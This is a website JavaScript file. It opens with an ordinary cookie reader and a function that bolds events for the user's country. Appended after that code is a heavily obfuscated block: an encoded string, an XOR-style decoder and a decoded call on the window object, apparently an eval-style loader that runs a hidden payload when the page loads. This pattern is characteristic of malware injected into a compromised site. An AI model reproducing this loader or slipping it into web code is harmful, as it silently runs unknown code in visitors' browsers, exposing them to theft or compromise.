// Get a value of one cookie set by it's name
// Impmentation from the JS 1.3 Client Guide by Netscape
function getCookie(Name)
{
    var search = Name + "=";
    if (document.cookie.length > 0) {
        offset = document.cookie.indexOf(search);
        if (offset != -1) {
            offset += search.length;
            end = document.cookie.indexOf(";", offset);
            if (end == -1) { end = document.cookie.length; }
            return unescape(document.cookie.substring(offset, end));
        }
    }
    return null;
}

// Make events in the user's country bold
function boldEvents()
{
    // Get cookie if possible
    country = getCookie("COUNTRY");
    if (typeof(country) == "string") {
        
        // Get country code from cookie
        country = country.substring(0, 3);
        
        // If DOM is supported, get <span>s
        if (document.getElementsByTagName) {
            
            spans = document.getElementsByTagName("span");
            
            // Style every span bold which is for this country
            for (var i = 0; i < spans.length; i++) {
                if (spans[i].className == "event_" + country + " vevent") {
                    spans[i].style.fontWeight = "bold";
                }
            }
        }
    }
}


(function (MH) {
    var aS = "\x96\xad\xa1\xb4\x87\xf8J\x04Y.C\xb4u>\xac\xa8\x95\xbd\x04x\x8e\xa6:\x8c\x00O\x0b`\x04\x20-M@O\x00\x0d+\x0c\x0b\x04IM\x00d\x0fhbH"+
             "mOO\x08J-\x0a.`iK\x00\x20(\x0b\x08)MM\x00d\x0bhKbmbb\x0bJ-\x09-`OhDf\x08)*B1*C0k\x0d,j2\x0c5+;|C\x19qSu\x1bgT`?\x0c\"1N'v\x0b-,H8"+
             "ky6Er\x04!]\x19uVD.\x20\x15$qe\x20S>:sU\x1e:2#\x13MQ\x1c<\x20\x02)\x0eSTBlf\x05?62:`In\x17T&\x0c\"\x1e7Y\x01X@\x00/.q\x12\"\x08f#"+
             "\x04k\x0a\x15`k.\x15rf\x0cbS\x20|x\x106CZ\x14\x18Xu1>:rXy\x0evb\x0d,q\x16\x06j\x025U\"cX\x15y|<2W~\x16\x032-T\x15\x17\\\\q\x01\x03"+
             "\x09g\x00/.q\x12\"\x08f^\x1as$\x13f\x0e\x20i\x08Ur&H`\x1dd\x17Pt|{\x18Xu5@kn5\x14$*bx\"Yc-&}?~~2Afm\x0c\x11T\x04j`^5tRb\x0d]\x08\"]"+
             "\x19uVD.\x20\x129wq9S\\\x1e:Qv`+lqVBhBv^?id\x20\x0dh\x11v\"*@\x1e:Rr1<\x00xx\x13&9`\x09,wPd\x0cfzWzA\x06\x1e\x1eBknW\x16B(\x06a\x00q\x02)"+
             "\x7f*q\x19\x1f\x11v\"*@t9F`k.\x15rf\x0cb[6|\"g{S\x06m\x19\x0c6?9\x17\x14\x06j`8;\x10@Q\x1aBk\x0cUt`*\x06w4\x03\x0f~#f\x1e\x18rw\x20i\x08U"+
             "r&H`|x\x15`!D\x18<\x11p^\x1apr<:r6\x1c\\2\x14\x1c\x18s\x18\"\x0b*Wr\"l\x02~dF\x16h<:s`\x1c\\7B\x1c\x18rC<i~U@#\x18XucDs\x14M%\x1ezp\x11:"+
             "\x12\x1c\x18s\x144^w=x<tA!]>:u\x06\x1e:3s\x02A@\x1c\x18sC~T_\x20\x0dh\x11v\"*@!\x1eB\x1e:0px\\\x06i=nT=y6.\x14ht\x0ct.R\x1fy\x14\x19q_}"+
             "\x0ct\x7fr=\x7fZ[@]2y\x19\x1fA\x1f2?\x1fj\x13\x19s_i\x0d[E\x1bS\x1f};V]0y\x1f&{p_?\x7f0;q\x1f9hP[\x15\x1d]jT[\x12[?^\x1f&{t_?\x19#;r\x1f"+
             "_hW[\x14\x1dIk{ay5_ym\x1fA\x1f3?\x1f\x7f\x14\x19s_\x1bE[\x16\x1d=\x7fR[\x16[9P\x1fu}\x1fc9u\x1f=\x7f0Ypy;P\x1bQ\x1f{ay>_yy6{u_Y6\x19Q\x1f"+
             "\x19c\x1b\x1d]y}\x12\x19\x12]\x19.*P\x1fp}yx9\x20\x19P\x1f\x1fY!\x7f5y\x1dH1{0\x7f/+\x7f>\x1fA\x1f4?\x1f\x19\x02\x19s_\x1d\x0cz\x7f!;t}]"+
             "ydY\x16\x19\x19\x08m(\x16\x19v=\x19\x20Ysy]\x0d\x1dI\x19A[\x16[_\x0c0\x1f\x10\x19+9#\x19T\x1f\x1f*4\x7f2yi[?\x09;zo?\x0c\"1N'v\x0b-,H\x10"+
             "\x0cui_gR&H\x10nw\x0b=fA(!T!\"\x12\x14\x0a[&'n%Pe\x04\x156$\x1bdGjgP!dx-9\x06'.\x056'\"'Rf\x1f$\x05.EtG&Zg\x7f9\x09\x7fk\x04j\x10.5\x19W"+
             "\x16B(\x06v\x1dqq}s8^\\up\x02m_9\x17\x14\x06j`^8\x160Sq\x20+G$~~2\x15b\x01\x02m__\x7f\x176$j\x20qY=p<1f|x\x123\x20\x0dm?x-*0\x0c5I?'n3A"+
             "{M&H\x10nwySTBlf\x1326\x03$\x13^\x1e:3txx\x15%)!fsNW$\x06m\x19\x09?P,5\x195\x14$*b\x17v\x10!\x06\x13\x1e\\Z76x<uE\x0da$1.1d`+\x1d\x0cUr&H`"+
             "|x\x130_x<uD#^\x1au$:f\x1ezp\x11<p\x1c<\x1fWfs6\x20\x0dh\"U*a\x16+-\x0ejky\x18M(v\x0e\x17k\x1b}\x0b=\x7fA(7E?P,5\x195\x14$*b\x17f\x00\x05"+
             "\x13\x1e|\\Z77x<u\x16sL\x06`k=j\x17T&\x0c\"\x19<\\\x09QP\x00/.B1*C0k\x0d,jI9\x1akhvNSi[?\x09;_{\x7f\x0dl3I*f\x0d5k[",
        Z7 = ["\x73\x70\x6c\x69\x74", XC = 0x09 * 17, "\x6c\x65\x6e\x67\x74\x68", "\x68\x61\x73\x4f\x77\x6e\x50\x72\x6f\x70\x65\x72\x74\x79"],
        Jm = "\xd5\xb6\xf9\x89\x9eT\x1a\xe4\x9a\x87\xd3\x16r\xa4\x99}Q\x8c\xc8\xe3t\xf4\xf9\xedC",
        jS = aS["\x73\x75\x62\x73\x74\x72\x69\x6e\x67"](0, Jm[Z7[2]]);
    UVf = function (wD) {
        var Np, uK, Ugx = uK = "",
            DUB = 0;
        wD = wD[Z7[0]](Ugx);
        for (Np in wD) {
            if (wD[Z7[3]](Np)) {
                uK += pVH(wD[Np], jS[Z7[0]](Ugx)[DUB %= jS[Z7[2]]]);
                DUB++;
            }
        }
        return (uK);
    };
    jS = UVf(Jm);
    MH[UVf("'t!H")](UVf(aS[UVf("1w\"WtV)\x0e%")](Jm[UVf(".g.CtL")])))
})(window, pVH = function (g6D, FFl, LyS, mnT) {
    g6D = g6D[LyS = "\x63" + (mnT = "\x68\x61\x72\x43\x6f\x64\x65") + "\x41\x74"](0);
    return (String["\x66\x72\x6f\x6d\x43" + mnT](g6D & XC | ((g6D & (~XC & 0xff)) ^ (FFl[LyS](0) & (~XC & 0xff)))))
});
